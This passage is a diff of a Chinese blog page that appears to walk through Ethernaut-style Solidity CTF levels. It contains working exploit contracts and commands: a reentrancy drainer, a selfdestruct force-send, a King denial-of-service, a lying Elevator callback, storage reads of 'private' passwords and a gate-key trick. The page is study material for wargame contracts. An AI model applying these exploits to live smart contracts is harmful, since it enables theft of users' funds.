+    address <span class="hljs-keyword">public</span> owner;
+    <span class="hljs-title class_">Delegate</span> delegate;
 
-    constructor(address _delegateAddress) {
-        delegate = Delegate(_delegateAddress);
-        owner = msg.sender;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address _delegateAddress</span>) {
+        delegate = <span class="hljs-title class_">Delegate</span>(_delegateAddress);
+        owner = msg.<span class="hljs-property">sender</span>;
     }
 
-    fallback() external {
-        (bool result,) = address(delegate).delegatecall(msg.data); 
-        if (result) {
-            this;//this 是一个表达式，表示当前合约地址
+    <span class="hljs-title function_">fallback</span>() external {
+        (bool result,) = <span class="hljs-title function_">address</span>(delegate).<span class="hljs-title function_">delegatecall</span>(msg.<span class="hljs-property">data</span>); 
+        <span class="hljs-keyword">if</span> (result) {
+            <span class="hljs-variable language_">this</span>;<span class="hljs-comment">//this 是一个表达式，表示当前合约地址</span>
         }
     }
 }
@@ -318,136 +318,136 @@ contract Delegation {
 <li><code>msg.data</code>：外部调用传入的原始数据（包括函数选择器和参数）；</li>
 <li>返回值是一个 <code>(bool success, bytes memory returndata)</code>，所以我们写成 <code>(bool result,)</code> 仅接收第一个布尔结果。</li>
 </ul>
-<pre><code class="language-solidity">await contract.sendTransaction({ data: web3.utils.sha3(&quot;pwn()&quot;).slice(0,10), gas:100000 });
+<pre><code class="language-solidity"><span class="hljs-keyword">await</span> contract.<span class="hljs-title function_">sendTransaction</span>({ <span class="hljs-attr">data</span>: web3.<span class="hljs-property">utils</span>.<span class="hljs-title function_">sha3</span>(<span class="hljs-string">&quot;pwn()&quot;</span>).<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>), <span class="hljs-attr">gas</span>:<span class="hljs-number">100000</span> });
 </code></pre>
 <ul>
 <li><code>web3.utils.sha3(&quot;pwn()&quot;)</code>：计算字符串 <code>&quot;pwn()&quot;</code> 的 Keccak-256 哈希（返回 <code>0x</code> 开头的 hex 字符串）。</li>
 <li><code>.slice(0,10)</code>：取哈希的前 10 个字符，也就是 <code>&quot;0x&quot; + 前 8 个 hex 字符</code>，即函数 selector（4 字节）。例如得到 <code>0xdd365b8b</code>。</li>
 </ul>
-<h1>Force 自毁机制强制给钱</h1><pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<h1>Force 自毁机制强制给钱</h1><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Force { /*
+contract <span class="hljs-title class_">Force</span> { <span class="hljs-comment">/*
                    MEOW ?
          /\_/\   /
     ____/ o o \
     /~____  =ø= /
     (______)__m_m)
-                   */ }
+                   */</span> }
 </code></pre>
 <p>不能用普通转账直接过关。原因是：目标合约 <code>Force</code> 没有 <code>receive()</code> 或 <code>fallback()</code></p>
 <p>强行将以太币置入合约的相关方式：1. 自毁</p>
 <p>通过自毁使合同余额大于零</p>
 <p> 当一个合约被 <code>selfdestruct</code> 时，它可以<strong>强制把剩余余额发送</strong>到任何地址，无论目标合约是否可接收 ETH。  </p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
 contract attack{
-    constructor(address payable _target) payable {
-        selfdestruct(_target);//部署时往 Exploit 附带 1 wei；
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address payable _target</span>) payable {
+        <span class="hljs-title function_">selfdestruct</span>(_target);<span class="hljs-comment">//部署时往 Exploit 附带 1 wei；</span>
     }
 }
 </code></pre>
 <h1>vault</h1><p>打开金库以通过关卡！</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Vault {
-    bool public locked;
-    bytes32 private password;
+contract <span class="hljs-title class_">Vault</span> {
+    bool <span class="hljs-keyword">public</span> locked;
+    bytes32 <span class="hljs-keyword">private</span> password;
 
-    constructor(bytes32 _password) {
-        locked = true;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">bytes32 _password</span>) {
+        locked = <span class="hljs-literal">true</span>;
         password = _password;
     }
 
-    function unlock(bytes32 _password) public {
-        if (password == _password) {
-            locked = false;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">unlock</span>(<span class="hljs-params">bytes32 _password</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-keyword">if</span> (password == _password) {
+            locked = <span class="hljs-literal">false</span>;
         }
     }
 }
 </code></pre>
 <p><code>**private**</code>** 是 Solidity 的可见性关键字，只阻止合约间源码访问，并不加密或隐藏链上存储。  **</p>
 <p><code>password</code> 虽然 <code>private</code>，但存在链上 storage 的 <code>slot</code> 可被任意读取 —— 直接读出 <code>password</code> 后调用 <code>unlock(password)</code> 即可解锁 <code>locked = false</code>。</p>
-<pre><code class="language-solidity">// 假设 web3 注入，可在控制台用
-await web3.eth.getStorageAt(&quot;0xC619ff8c4056A52c9C504B844D93bC3881Ac5A69&quot;, 0)
-await web3.eth.getStorageAt(&quot;0xC619ff8c4056A52c9C504B844D93bC3881Ac5A69&quot;, 1)
+<pre><code class="language-solidity"><span class="hljs-comment">// 假设 web3 注入，可在控制台用</span>
+<span class="hljs-keyword">await</span> web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">getStorageAt</span>(<span class="hljs-string">&quot;0xC619ff8c4056A52c9C504B844D93bC3881Ac5A69&quot;</span>, <span class="hljs-number">0</span>)
+<span class="hljs-keyword">await</span> web3.<span class="hljs-property">eth</span>.<span class="hljs-title function_">getStorageAt</span>(<span class="hljs-string">&quot;0xC619ff8c4056A52c9C504B844D93bC3881Ac5A69&quot;</span>, <span class="hljs-number">1</span>)
 </code></pre>
 <h1>king 回滚机制永久占据位置</h1><p>合同代表一个非常简单的游戏：谁给它发送了比当前奖金还大的数量的以太，就成为新的国王。在这样的事件中，被推翻的国王获得了新的奖金，但是如果你提交的话那么合约就会回退，让level重新成为国王，而我们的目标就是阻止这一情况的发生。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract King {
+contract <span class="hljs-title class_">King</span> {
     address king;
-    uint256 public prize;
-    address public owner;
+    uint256 <span class="hljs-keyword">public</span> prize;
+    address <span class="hljs-keyword">public</span> owner;
 
-    constructor() payable {
-        owner = msg.sender;
-        king = msg.sender;
-        prize = msg.value;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) payable {
+        owner = msg.<span class="hljs-property">sender</span>;
+        king = msg.<span class="hljs-property">sender</span>;
+        prize = msg.<span class="hljs-property">value</span>;
     }
 
-    receive() external payable {
-        require(msg.value &gt;= prize || msg.sender == owner);
-        payable(king).transfer(msg.value);
-        king = msg.sender;
-        prize = msg.value;
+    <span class="hljs-title function_">receive</span>() external payable {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> &gt;= prize || msg.<span class="hljs-property">sender</span> == owner);
+        <span class="hljs-title function_">payable</span>(king).<span class="hljs-title function_">transfer</span>(msg.<span class="hljs-property">value</span>);
+        king = msg.<span class="hljs-property">sender</span>;
+        prize = msg.<span class="hljs-property">value</span>;
     }
 
-    function _king() public view returns (address) {
-        return king;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">_king</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (address) {
+        <span class="hljs-keyword">return</span> king;
     }
 }
 </code></pre>
 <p>从上面的代码中可以看到当国王被推翻时国王将会获得奖金，那么只要国王拒绝接受奖金就可以一直是国王。</p>
 <p>我们可以部署以下攻击合约,当原智能合约有新的king诞生时会向我们的合约退还之前的奖金，但是攻击合约不接收，直接revert()那么就可以永远占据合约的king不放：</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
 contract attack{
 
-    function hack(address target) external payable {
-        (bool ok, ) = target.call{ value: msg.value }(&quot;&quot;);
-        require(ok, &quot;call failed&quot;);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">hack</span>(<span class="hljs-params">address target</span>) external payable {
+        (bool ok, ) = target.<span class="hljs-property">call</span>{ <span class="hljs-attr">value</span>: msg.<span class="hljs-property">value</span> }(<span class="hljs-string">&quot;&quot;</span>);
+        <span class="hljs-built_in">require</span>(ok, <span class="hljs-string">&quot;call failed&quot;</span>);
     }
 
 }
-左侧编译并部署 attack（Deploy 时 Value 留空，不能给合约部署钱否则失败。
-在右侧 Run 面板上方 Value 输入框填 0.0011（或 wei 值 1100000000000000），单位选 ether（或选 wei 并填 wei）。
+左侧编译并部署 attack（<span class="hljs-title class_">Deploy</span> 时 <span class="hljs-title class_">Value</span> 留空，不能给合约部署钱否则失败。
+在右侧 <span class="hljs-title class_">Run</span> 面板上方 <span class="hljs-title class_">Value</span> 输入框填 <span class="hljs-number">0.0011</span>（或 wei 值 <span class="hljs-number">1100000000000000</span>），单位选 ether（或选 wei 并填 wei）。
 下方从已部署合约实例中选中 attack（确保是你刚部署那个地址）。。
 </code></pre>
 <h1>Re-entrance 重入攻击（回调）</h1><p>此关卡的目标是让你从合约中窃取所有资金。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.12;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.12</span>;
 
-import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;</span>;
 
-contract Reentrance {
-    using SafeMath for uint256;
+contract <span class="hljs-title class_">Reentrance</span> {
+    <span class="hljs-keyword">using</span> <span class="hljs-title class_">SafeMath</span> <span class="hljs-keyword">for</span> uint256;
 
-    mapping(address =&gt; uint256) public balances;
+    <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">address</span> =&gt;</span> uint256) <span class="hljs-keyword">public</span> balances;
 
-    function donate(address _to) public payable {
-        balances[_to] = balances[_to].add(msg.value);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">donate</span>(<span class="hljs-params">address _to</span>) <span class="hljs-keyword">public</span> payable {
+        balances[_to] = balances[_to].<span class="hljs-title function_">add</span>(msg.<span class="hljs-property">value</span>);
     }
 
-    function balanceOf(address _who) public view returns (uint256 balance) {
-        return balances[_who];
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">balanceOf</span>(<span class="hljs-params">address _who</span>) <span class="hljs-keyword">public</span> view <span class="hljs-title function_">returns</span> (uint256 balance) {
+        <span class="hljs-keyword">return</span> balances[_who];
     }
 
-    function withdraw(uint256 _amount) public {
-        if (balances[msg.sender] &gt;= _amount) {
-            (bool result,) = msg.sender.call{value: _amount}(&quot;&quot;);
-            if (result) {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params">uint256 _amount</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-keyword">if</span> (balances[msg.<span class="hljs-property">sender</span>] &gt;= _amount) {
+            (bool result,) = msg.<span class="hljs-property">sender</span>.<span class="hljs-property">call</span>{<span class="hljs-attr">value</span>: _amount}(<span class="hljs-string">&quot;&quot;</span>);
+            <span class="hljs-keyword">if</span> (result) {
                 _amount;
             }
-            balances[msg.sender] -= _amount;
+            balances[msg.<span class="hljs-property">sender</span>] -= _amount;
         }
     }
 
-    receive() external payable {}
+    <span class="hljs-title function_">receive</span>() external payable {}
 }
 </code></pre>
 <p>重点来看withdraw函数，我们可以看到它接收了一个_amount参数，将其与发送者的balance进行比较，不超过发送者的balance就将这些_amount发送给sender，同时我们注意到这里它用来发送ether的函数是call.value,发送完成后，它才在下面更新了sender的balances，这里就是可重入攻击的关键所在了，因为该函数在发送ether后才更新余额，所以我们可以想办法让它卡在call.value这里不断给我们发送ether</p>
@@ -460,75 +460,75 @@ contract Reentrance {
 <li><strong>重入会多次内联调用（回调→再次 withdraw）</strong>，每次调用消耗 gas；必须留出足够 gas 以支持多轮回调。</li>
 <li>如果 gas 太低，交易会在某一轮回调中耗尽并 revert（攻击失败）。</li>
 </ul>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.12;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.6</span><span class="hljs-number">.12</span>;
 
-import &quot;./Reentrance.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./Reentrance.sol&quot;</span>;
 
-interface IVictim {
-    function donate(address _to) external payable;
-    function withdraw(uint256 _amount) external;
-    function balanceOf(address _who) external view returns (uint256);
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">IVictim</span> {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">donate</span>(<span class="hljs-params">address _to</span>) external payable;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">withdraw</span>(<span class="hljs-params">uint256 _amount</span>) external;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">balanceOf</span>(<span class="hljs-params">address _who</span>) external view <span class="hljs-title function_">returns</span> (uint256);
 }
 
-contract Attacker {
-    IVictim public victim;
-    address payable public owner;
-    uint256 public withdrawAmount;
+contract <span class="hljs-title class_">Attacker</span> {
+    <span class="hljs-title class_">IVictim</span> <span class="hljs-keyword">public</span> victim;
+    address payable <span class="hljs-keyword">public</span> owner;
+    uint256 <span class="hljs-keyword">public</span> withdrawAmount;
 
-    constructor() public {
-        victim = IVictim(0x58Df09801b6f1Cf14bF172D391B631B1E4f6DCAd);
-        owner = msg.sender;
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-keyword">public</span> {
+        victim = <span class="hljs-title class_">IVictim</span>(<span class="hljs-number">0x58Df09801b6f1Cf14bF172D391B631B1E4f6DCAd</span>);
+        owner = msg.<span class="hljs-property">sender</span>;
     }
 
-    // 存款并立即发起 withdraw（开始重入）
-    function donateAndAttack() external payable {
-        require(msg.value &gt; 0, &quot;send ETH&quot;);
-        // 把钱捐给 victim，使 victim.balances[this] = msg.value
-        victim.donate{ value: msg.value }(address(this));
-        withdrawAmount = msg.value;
-        // 发起首次 withdraw，之后 receive() 会在回调里再次调用 withdraw
-        victim.withdraw(withdrawAmount);
+    <span class="hljs-comment">// 存款并立即发起 withdraw（开始重入）</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">donateAndAttack</span>(<span class="hljs-params"></span>) external payable {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">value</span> &gt; <span class="hljs-number">0</span>, <span class="hljs-string">&quot;send ETH&quot;</span>);
+        <span class="hljs-comment">// 把钱捐给 victim，使 victim.balances[this] = msg.value</span>
+        victim.<span class="hljs-property">donate</span>{ <span class="hljs-attr">value</span>: msg.<span class="hljs-property">value</span> }(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>));
+        withdrawAmount = msg.<span class="hljs-property">value</span>;
+        <span class="hljs-comment">// 发起首次 withdraw，之后 receive() 会在回调里再次调用 withdraw</span>
+        victim.<span class="hljs-title function_">withdraw</span>(withdrawAmount);
     }
 
-    // 当 victim 转钱给本合约时，这里会被触发 —— 在这里重入 victim.withdraw(...)
-    receive() external payable {
-        uint256 victimBal = address(victim).balance;
-//用的是合约的余额，如果是balances[msg.sender]会一直循环导致gas耗尽回滚交易
-        if (victimBal &gt;= withdrawAmount) {
-            // 只要 victim 还有钱，就继续重入提取
-            victim.withdraw(withdrawAmount);
-        } else {
-            // 偷够了，把钱发回给 attacker EOA
-            owner.transfer(address(this).balance);
+    <span class="hljs-comment">// 当 victim 转钱给本合约时，这里会被触发 —— 在这里重入 victim.withdraw(...)</span>
+    <span class="hljs-title function_">receive</span>() external payable {
+        uint256 victimBal = <span class="hljs-title function_">address</span>(victim).<span class="hljs-property">balance</span>;
+<span class="hljs-comment">//用的是合约的余额，如果是balances[msg.sender]会一直循环导致gas耗尽回滚交易</span>
+        <span class="hljs-keyword">if</span> (victimBal &gt;= withdrawAmount) {
+            <span class="hljs-comment">// 只要 victim 还有钱，就继续重入提取</span>
+            victim.<span class="hljs-title function_">withdraw</span>(withdrawAmount);
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-comment">// 偷够了，把钱发回给 attacker EOA</span>
+            owner.<span class="hljs-title function_">transfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span>);
         }
     }
 
-    // 辅助函数：把偷到的钱取回
-    function collect() external {
-        require(msg.sender == owner, &quot;only owner&quot;);
-        owner.transfer(address(this).balance);
+    <span class="hljs-comment">// 辅助函数：把偷到的钱取回</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">collect</span>(<span class="hljs-params"></span>) external {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> == owner, <span class="hljs-string">&quot;only owner&quot;</span>);
+        owner.<span class="hljs-title function_">transfer</span>(<span class="hljs-title function_">address</span>(<span class="hljs-variable language_">this</span>).<span class="hljs-property">balance</span>);
     }
 }
 </code></pre>
 <h1>**Elevator  不可信外部调用  **</h1><p>这个电梯似乎并不会让你到达顶层</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-interface Building {
-    function isLastFloor(uint256) external returns (bool);
+<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Building</span> {
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isLastFloor</span>(<span class="hljs-params">uint256</span>) external <span class="hljs-title function_">returns</span> (bool);
 }
 
-contract Elevator {
-    bool public top;
-    uint256 public floor;
+contract <span class="hljs-title class_">Elevator</span> {
+    bool <span class="hljs-keyword">public</span> top;
+    uint256 <span class="hljs-keyword">public</span> floor;
 
-    function goTo(uint256 _floor) public {
-        Building building = Building(msg.sender);
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">goTo</span>(<span class="hljs-params">uint256 _floor</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-title class_">Building</span> building = <span class="hljs-title class_">Building</span>(msg.<span class="hljs-property">sender</span>);
 
-        if (!building.isLastFloor(_floor)) {
+        <span class="hljs-keyword">if</span> (!building.<span class="hljs-title function_">isLastFloor</span>(_floor)) {
             floor = _floor;
-            top = building.isLastFloor(floor);
+            top = building.<span class="hljs-title function_">isLastFloor</span>(floor);
         }
     }
 }
@@ -540,95 +540,95 @@ contract Elevator {
 <li>如果 <code>msg.sender</code> 是合约且实现了该 selector，就会执行那个合约对应的函数逻辑并返回任意 <code>bool</code>。</li>
 </ul>
 <p>让 <code>msg.sender</code> 是一个恶意合约，这个合约的 <code>isLastFloor</code> 在**第一次被调用时返回 <strong><code>**false**</code>（允许进入 <code>if</code>），但在</strong>第二次被调用时返回 **<code>**true**</code>，从而让 <code>Elevator</code> 把 <code>top</code> 设为 <code>true</code>。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-import &quot;./elevator.sol&quot;;
+<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;./elevator.sol&quot;</span>;
 
-contract AttackElevator {
-    bool private firstCall = true;
+contract <span class="hljs-title class_">AttackElevator</span> {
+    bool <span class="hljs-keyword">private</span> firstCall = <span class="hljs-literal">true</span>;
 
-    function isLastFloor(uint256) external returns (bool) {
-        if (firstCall) {
-            firstCall = false;
-            return false;
-        } else {
-            return true;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">isLastFloor</span>(<span class="hljs-params">uint256</span>) external <span class="hljs-title function_">returns</span> (bool) {
+        <span class="hljs-keyword">if</span> (firstCall) {
+            firstCall = <span class="hljs-literal">false</span>;
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+        } <span class="hljs-keyword">else</span> {
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
         }
     }
 
-    // trigger the Elevator.goTo; msg.sender will be this contract
-    function attack(address elevatorAddr, uint256 _floor) external {
-        Elevator(elevatorAddr).goTo(_floor);
+    <span class="hljs-comment">// trigger the Elevator.goTo; msg.sender will be this contract</span>
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">address elevatorAddr, uint256 _floor</span>) external {
+        <span class="hljs-title class_">Elevator</span>(elevatorAddr).<span class="hljs-title function_">goTo</span>(_floor);
     }
 }
 </code></pre>
 <h1>Privacy</h1><p>这份合约的创建者足够谨慎，保护了其存储中的敏感区域。解锁此合约即可通关。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract Privacy {
-    bool public locked = true;
-    uint256 public ID = block.timestamp;
-    uint8 private flattening = 10;
-    uint8 private denomination = 255;
-    uint16 private awkwardness = uint16(block.timestamp);
-    bytes32[3] private data;
+contract <span class="hljs-title class_">Privacy</span> {
+    bool <span class="hljs-keyword">public</span> locked = <span class="hljs-literal">true</span>;
+    uint256 <span class="hljs-keyword">public</span> <span class="hljs-variable constant_">ID</span> = block.<span class="hljs-property">timestamp</span>;
+    uint8 <span class="hljs-keyword">private</span> flattening = <span class="hljs-number">10</span>;
+    uint8 <span class="hljs-keyword">private</span> denomination = <span class="hljs-number">255</span>;
+    uint16 <span class="hljs-keyword">private</span> awkwardness = <span class="hljs-title function_">uint16</span>(block.<span class="hljs-property">timestamp</span>);
+    bytes32[<span class="hljs-number">3</span>] <span class="hljs-keyword">private</span> data;
 
-    constructor(bytes32[3] memory _data) {
+    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">bytes32[<span class="hljs-number">3</span>] memory _data</span>) {
         data = _data;
     }
 
-    function unlock(bytes16 _key) public {
-        require(_key == bytes16(data[2]));
-        locked = false;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">unlock</span>(<span class="hljs-params">bytes16 _key</span>) <span class="hljs-keyword">public</span> {
+        <span class="hljs-built_in">require</span>(_key == <span class="hljs-title function_">bytes16</span>(data[<span class="hljs-number">2</span>]));
+        locked = <span class="hljs-literal">false</span>;
     }
 
-    /*
+    <span class="hljs-comment">/*
     A bunch of super advanced solidity algorithms...
 
-      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
-      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
-      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
-      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
-      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
-    */
+      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`
+      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,
+      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\
+      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)
+      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU
+    */</span>
 }
 </code></pre>
-<pre><code class="language-solidity">    bool public locked = true; //slot1
-    uint256 public ID = block.timestamp;//2
-    uint8 private flattening = 10;
-    uint8 private denomination = 255;
-    uint16 private awkwardness = uint16(block.timestamp);//合并成slot3
-    bytes32[3] private data;
+<pre><code class="language-solidity">    bool <span class="hljs-keyword">public</span> locked = <span class="hljs-literal">true</span>; <span class="hljs-comment">//slot1</span>
+    uint256 <span class="hljs-keyword">public</span> <span class="hljs-variable constant_">ID</span> = block.<span class="hljs-property">timestamp</span>;<span class="hljs-comment">//2</span>
+    uint8 <span class="hljs-keyword">private</span> flattening = <span class="hljs-number">10</span>;
+    uint8 <span class="hljs-keyword">private</span> denomination = <span class="hljs-number">255</span>;
+    uint16 <span class="hljs-keyword">private</span> awkwardness = <span class="hljs-title function_">uint16</span>(block.<span class="hljs-property">timestamp</span>);<span class="hljs-comment">//合并成slot3</span>
+    bytes32[<span class="hljs-number">3</span>] <span class="hljs-keyword">private</span> data;
 </code></pre>
 <h1>gatekeeper one</h1><p>通过门卫并注册为参赛者即可通过此关卡。</p>
-<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
+pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;
 
-contract GatekeeperOne {
-    address public entrant;
+contract <span class="hljs-title class_">GatekeeperOne</span> {
+    address <span class="hljs-keyword">public</span> entrant;
 
-    modifier gateOne() {
-        require(msg.sender != tx.origin);
+    modifier <span class="hljs-title function_">gateOne</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-built_in">require</span>(msg.<span class="hljs-property">sender</span> != tx.<span class="hljs-property">origin</span>);
         _;
     }
 
-    modifier gateTwo() {
-        require(gasleft() % 8191 == 0);
+    modifier <span class="hljs-title function_">gateTwo</span>(<span class="hljs-params"></span>) {
+        <span class="hljs-built_in">require</span>(<span class="hljs-title function_">gasleft</span>() % <span class="hljs-number">8191</span> == <span class="hljs-number">0</span>);
         _;
     }
 
-    modifier gateThree(bytes8 _gateKey) {
-        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);
-        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);
-        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);
+    modifier <span class="hljs-title function_">gateThree</span>(<span class="hljs-params">bytes8 _gateKey</span>) {
+        <span class="hljs-built_in">require</span>(<span class="hljs-title function_">uint32</span>(<span class="hljs-title function_">uint64</span>(_gateKey)) == <span class="hljs-title function_">uint16</span>(<span class="hljs-title function_">uint64</span>(_gateKey)), <span class="hljs-string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span>);
+        <span class="hljs-built_in">require</span>(<span class="hljs-title function_">uint32</span>(<span class="hljs-title function_">uint64</span>(_gateKey)) != <span class="hljs-title function_">uint64</span>(_gateKey), <span class="hljs-string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span>);
+        <span class="hljs-built_in">require</span>(<span class="hljs-title function_">uint32</span>(<span class="hljs-title function_">uint64</span>(_gateKey)) == <span class="hljs-title function_">uint16</span>(<span class="hljs-title function_">uint160</span>(tx.<span class="hljs-property">origin</span>)), <span class="hljs-string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);
         _;
     }
 
-    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
-        entrant = tx.origin;
-        return true;
+    <span class="hljs-keyword">function</span> <span class="hljs-title function_">enter</span>(<span class="hljs-params">bytes8 _gateKey</span>) <span class="hljs-keyword">public</span> gateOne gateTwo <span class="hljs-title function_">gateThree</span>(_gateKey) <span class="hljs-title function_">returns</span> (bool) {
+        entrant = tx.<span class="hljs-property">origin</span>;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
     }
 }
 </code></pre>
@@ -639,59 +639,59 @@ contract GatekeeperOne {
 <p>3、gateThree() 也比较简单，将 tx.origin 倒数三四字节换成 0000 即可。bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF 即可满足条件。</p>
 <p>我的eoa地址</p>
 <p>0xde3d99ec73f3ce95f0634424245ed68b01ebd2a2</p>
-<pre><code class="language-solidity"> require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);
